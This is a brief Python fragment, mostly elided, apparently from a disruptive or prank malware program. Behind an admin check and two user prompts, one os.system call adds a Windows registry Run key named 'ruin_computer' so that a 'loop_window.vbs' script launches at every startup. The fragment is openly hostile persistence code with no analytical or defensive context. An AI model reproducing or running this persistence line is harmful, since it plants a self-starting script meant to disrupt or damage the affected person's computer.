    ...
    if is_admin():
        ...
        if user_choice1:
            ...
            if user_choice2:
                ...
                os.system(r"reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ /v ruin_computer /t REG_SZ /d "+__file__.replace('main-exe.exe', 'loop_window.vbs')+" /f")
